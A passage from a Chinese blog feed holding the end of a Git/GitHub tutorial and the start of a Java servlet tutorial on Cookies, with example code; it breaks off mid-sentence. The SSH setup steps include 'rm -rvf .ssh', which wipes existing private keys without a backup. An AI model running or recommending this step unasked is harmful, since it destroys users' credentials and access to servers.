class="headerlink" title="Git文件管理机制细节"></a>Git文件管理机制细节</h3><ul><li>Git 的”提交对象“</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215020.png"></p><ul><li>提交对象及其父对象形成的链条</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215021.png"></p><h3 id="Git分支管理机制"><a href="#Git分支管理机制" class="headerlink" title="Git分支管理机制"></a>Git分支管理机制</h3><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215022.png"></p><hr><p><strong>由master分支切换到testing分支：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215023.png"></p><hr><p><strong>testing分支提交到本地库：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215024.png"></p><hr><p><strong>切换回master分支：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215025.png"></p><hr><p><strong>master分支提交到本地库：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215026.png"></p><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><h3 id="创建远程仓库"><a href="#创建远程仓库" class="headerlink" title="创建远程仓库"></a>创建远程仓库</h3><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201008140047.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201008140332.png"></p><h3 id="查看远程仓库地址"><a href="#查看远程仓库地址" class="headerlink" title="查看远程仓库地址"></a>查看远程仓库地址</h3><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201008140720.png"></p><h3 id="查看当前所有远程地址别名"><a href="#查看当前所有远程地址别名" class="headerlink" title="查看当前所有远程地址别名"></a>查看当前所有远程地址别名</h3><p><code>git remote -v</code></p><h3 id="创建远程库地址别名"><a href="#创建远程库地址别名" class="headerlink" title="创建远程库地址别名"></a>创建远程库地址别名</h3><p><code>git remote add [别名] [远程地址]</code></p><h3 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h3><p><code>git push [别名] [分支名]</code></p><h3 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h3><p><code>git clone &lt;-b 分支名&gt; [远程地址] &lt;本地目录名&gt;</code></p><p>&lt;&gt;表示可选，默认克隆master分支，本地目录名称与版本库同名。</p><blockquote><p>效果：完整的把远程库下载到本地，创建 origin 远程地址别名，初始化本地库</p></blockquote><h3 id="团队成员邀请"><a href="#团队成员邀请" class="headerlink" title="团队成员邀请"></a>团队成员邀请</h3><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201008143446.png"></p><h3 id="拉取"><a href="#拉取" class="headerlink" title="拉取"></a>拉取</h3><ul><li><p>pull&#x3D;fetch+merge </p></li><li><p>git fetch [远程库地址别名] [远程分支名] </p></li><li><p>git merge [远程库地址别名&#x2F;远程分支名] </p></li><li><p>git pull [远程库地址别名] [远程分支名]</p></li></ul><h3 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h3><p>要点：如果不是基于 GitHub 远程库的最新版所做的修改，不能推送，必须先拉取。 拉取下来后如果进入冲突状态，则按照“分支冲突解决”操作解决即可。 </p><p>类比：</p><p>债权人：老王 </p><p>债务人：小刘 </p><p>老王说：10 天后归还。小刘接受，双方达成一致。 </p><p>老王媳妇说：5 天后归还。小刘不能接受。老王媳妇需要找老王确认没有冲突后再执行。</p><h3 id="SSH免密登录"><a href="#SSH免密登录" class="headerlink" title="SSH免密登录"></a>SSH免密登录</h3><ul><li><p>进入当前用户的家目录 </p><p><code>$ cd ~</code></p></li><li><p>删除.ssh 目录 </p><p><code>$ rm -rvf .ssh</code></p></li><li><p>运行命令生成.ssh 密钥目录 </p><p><code>$ ssh-keygen -t rsa -C 839777408@qq.com</code> </p></li><li><p>进入.ssh 目录查看文件列表 </p><p><code>$ cd .ssh</code> </p><p><code>$ ls -lF </code></p></li><li><p>查看 id_rsa.pub 文件内容</p><p><code>$ cat id_rsa.pub</code> </p></li><li><p>复制 id_rsa.pub 文件内容，登录 GitHub，点击用户头像→Settings→SSH and GPG keys→New SSH Key </p></li><li><p>输入复制的密钥信息</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cookie和Session</title>
      <link href="/posts/9279/"/>
      <url>/posts/9279/</url>
      
        <content type="html"><![CDATA[<p>会话跟踪是Web程序中常用的技术，用来<strong>跟踪用户的整个会话</strong>。常用的会话跟踪技术是Cookie与Session。<strong>Cookie通过在客户端记录信息确定用户身份</strong>，<strong>Session通过在服务器端记录信息确定用户身份</strong>。</p><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="什么是Cookie"><a href="#什么是Cookie" class="headerlink" title="什么是Cookie"></a>什么是Cookie</h2><p>由于HTTP是一种无状态的协议，服务器单从网络连接上无从知道客户身份。怎么办呢？就<strong>给客户端们颁发一个通行证吧，每人一个，无论谁访问都必须携带自己通行证。这样服务器就能从通行证上确认客户身份了。这就是Cookie的工作原理</strong>。</p><p>Cookie实际上是一小段的文本信息。客户端请求服务器，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。服务器还可以根据需要修改Cookie的内容。</p><p>在Session出现之前，基本上所有的网站都采用Cookie来跟踪会话。</p><blockquote><p><strong>Cookie具有不可跨域名性</strong>。例如贴吧不能访问微博的Cookie。</p><p>由于浏览器每次请求服务器都会携带Cookie，因此Cookie内容不宜过多，否则影响速度。<strong>Cookie的内容应该少而精。</strong></p></blockquote><h2 id="Cookie常用属性"><a href="#Cookie常用属性" class="headerlink" title="Cookie常用属性"></a>Cookie常用属性</h2><p>Cookie对象使用key-value属性对的形式保存用户状态，一个Cookie对象保存一个属性对，一个request或者response同时使用多个Cookie。</p><table><thead><tr><th>属 性 名</th><th>描  述</th></tr></thead><tbody><tr><td>String name</td><td>该Cookie的名称。Cookie一旦创建，名称便不可更改</td></tr><tr><td>Object value</td><td>该Cookie的值。如果值为Unicode字符（例如中文），需要为字符编码。如果值为二进制数据（例如图片），则需要使用BASE64编码</td></tr><tr><td>int maxAge</td><td>该Cookie失效的时间，单位秒。如果为正数，则该Cookie在maxAge秒之后失效。如果为负数，该Cookie为临时Cookie，关闭浏览器即失效，浏览器也不会以任何形式保存该Cookie。如果为0，表示立即删除该Cookie。默认为–1</td></tr><tr><td>boolean secure</td><td>该Cookie是否仅被使用安全协议传输。安全协议。安全协议有HTTPS，SSL等，在网络上传输数据之前先将数据加密。默认为false</td></tr><tr><td>String path</td><td>该Cookie的使用路径。如果设置为“&#x2F;sessionWeb&#x2F;”，则只有contextPath为“&#x2F;sessionWeb”的程序可以访问该Cookie。如果设置为“&#x2F;”，则本域名下contextPath都可以访问该Cookie。</td></tr><tr><td>String domain</td><td>可以访问该Cookie的域名。如果设置为“.google.com”，则所有以“google.com”结尾的域名都可以访问该Cookie。注意第一个字符必须为“.”</td></tr><tr><td>String comment</td><td>该Cookie的用处说明。浏览器显示Cookie信息的时候显示该说明</td></tr><tr><td>int version</td><td>该Cookie使用的版本号。0表示遵循Netscape的Cookie规范，1表示遵循W3C的RFC 2109规范</td></tr></tbody></table><h2 id="测试页面和BaseServlet"><a href="#测试页面和BaseServlet" class="headerlink" title="测试页面和BaseServlet"></a>测试页面和BaseServlet</h2><p><strong>测试页面：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;pragma&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-cache&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;cache-control&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-cache&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Expires&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Cookie<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost:8080/cookie_session/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">list-style</span>: none;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;target&quot;</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500&quot;</span> <span class="attr">style</span>=<span class="string">&quot;float: left;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;float: left;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;cookieServlet?action=createCookie&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Cookie的创建<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;cookieServlet?action=getCookie&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Cookie的获取<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;cookieServlet?action=updateCookie&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Cookie值的修改<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Cookie的存活周期<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;cookieServlet?action=defaultLife&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Cookie的默认存活时间（会话）<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;cookieServlet?action=deleteNow&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Cookie立即删除<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;cookieServlet?action=life3600&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Cookie存活3600秒（1小时）<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;cookieServlet?action=testPath&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Cookie的路径设置<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;login.jsp&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Cookie的用户免登录练习<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>BaseServlet程序：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">BaseServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 解决post请求中文乱码问题</span></span><br><span class="line">        <span class="comment">// 一定要在获取请求参数之前调用才有效</span></span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 解决响应中文乱码问题</span></span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;action&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取action业务鉴别字符串，获取相应的业务 方法反射对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getDeclaredMethod(action, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">            <span class="comment">// System.out.println(method);</span></span><br><span class="line">            <span class="comment">// 调用目标业务方法</span></span><br><span class="line">            method.invoke(<span class="built_in">this</span>, req, resp);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="创建和获取Cookie"><a href="#创建和获取Cookie" class="headerlink" title="创建和获取Cookie"></a>创建和获取Cookie</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CookieServlet</span> <span class="keyword">extends</span> <span class="title class_">BaseServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">createCookie</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        resp.addCookie(cookie1);</span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;key2&quot;</span>, <span class="string">&quot;value2&quot;</span>);</span><br><span class="line">        resp.addCookie(cookie2);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Cookie创建成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">getCookie</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        Cookie[] cookies = req.getCookies();</span><br><span class="line">        <span class="keyword">for</span> (Cookie cookie : cookies) &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;Cookie[&quot;</span> + cookie.getName() + <span class="string">&quot;=&quot;</span> + cookie.getValue() + <span class="string">&quot;] &lt;br/&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="创建Cookie的工具类"><a href="#创建Cookie的工具类" class="headerlink" title="创建Cookie的工具类"></a>创建Cookie的工具类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CookieUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Cookie <span class="title function_">findCookie</span><span class="params">(String name, Cookie[] cookies)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">null</span> || cookies == <span class="literal">null</span> || cookies.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Cookie cookie : cookies) &#123;</span><br><span class="line">            <span class="keyword">if</span> (name.equals(cookie.getName())) &#123;</span><br><span class="line">                <span class="keyword">return</span> cookie;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改Cookie"><a href="#修改Cookie" class="headerlink" title="修改Cookie"></a>修改Cookie</h2><p>方案一： </p><ol><li><p>先创建一个要修改的同名（指的就是 key）的 Cookie 对象 。</p></li><li><p>在构造器，同时赋于新的 Cookie 值。 </p></li><li><p>调用 response.addCookie( Cookie );;通知客户端保存修改。</p></li></ol><p>方案二： </p><ol><li><p>先查找到需要修改的 Cookie 对象 。</p></li><li><p>调用 setValue()方法赋于新的 Cookie 值。 </p></li><li><p>调用 response.addCookie( Cookie );通知客户端保存修改。</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CookieServlet</span> <span class="keyword">extends</span> <span class="title class_">BaseServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">updateCookie</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;newValue1&quot;</span>);</span><br><span class="line">        resp.addCookie(cookie1);</span><br><span class="line"></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie2</span> <span class="operator">=</span> CookieUtils.findCookie(<span class="string">&quot;key2&quot;</span>, req.getCookies());</span><br><span class="line">        cookie2.setValue(<span class="string">&quot;newValue2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        resp.addCookie(cookie2);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Cookie修改成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Cookie-生命周期控制"><a href="#Cookie-生命周期控制" class="headerlink" title="Cookie 生命周期控制"></a>Cookie 生命周期控制</h2><p>Cookie 的生命周期控制指的是如何管理 Cookie 什么时候被销毁（删除） </p><p>setMaxAge() </p><ul><li><p>正数，表示在指定的秒数后过期 </p></li><li><p>负数，表示浏览器一关，Cookie 就会被删除（默认值是-1） </p></li><li><p>零，表示马上删除 Cookie</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CookieServlet</span> <span class="keyword">extends</span> <span class="title class_">BaseServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">defaultLife</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;defalutLife&quot;</span>, <span class="string">&quot;defaultLife&quot;</span>);</span><br><span class="line">        cookie.setMaxAge(-<span class="number">1</span>);<span class="comment">//设置存活时间，默认为-1</span></span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">deleteNow</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> CookieUtils.findCookie(<span class="string">&quot;key2&quot;</span>, req.getCookies());</span><br><span class="line">        <span class="keyword">if</span> (cookie != <span class="literal">null</span>) &#123;</span><br><span class="line">            cookie.setMaxAge(<span class="number">0</span>); <span class="comment">// 表示马上删除，不需要等待浏览器关闭</span></span><br><span class="line">            resp.addCookie(cookie);</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;key2的Cookie已经被删除&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">life3600</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;life3600&quot;</span>, <span class="string">&quot;life3600&quot;</span>);</span><br><span class="line">        cookie.setMaxAge(<span class="number">60</span> * <span class="number">60</span>); <span class="comment">// 设置 Cookie 一小时之后被删除。</span></span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;已经创建了一个存活一小时的 Cookie&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><blockquote><p>修改、删除Cookie时，新建的Cookie除value、maxAge之外的所有属性，例如name、path、domain等，都要与原Cookie完全一样。否则，浏览器将视为两个不同的Cookie不予覆盖，导致修改、删除失败。</p></blockquote><h2 id="Cookie-有效路径-Path-的设置"><a href="#Cookie-有效路径-Path-的设置" class="headerlink" title="Cookie 有效路径 Path 的设置"></a>Cookie 有效路径 Path 的设置</h2><p>Cookie 的 path 属性可以有效的过滤哪些 Cookie 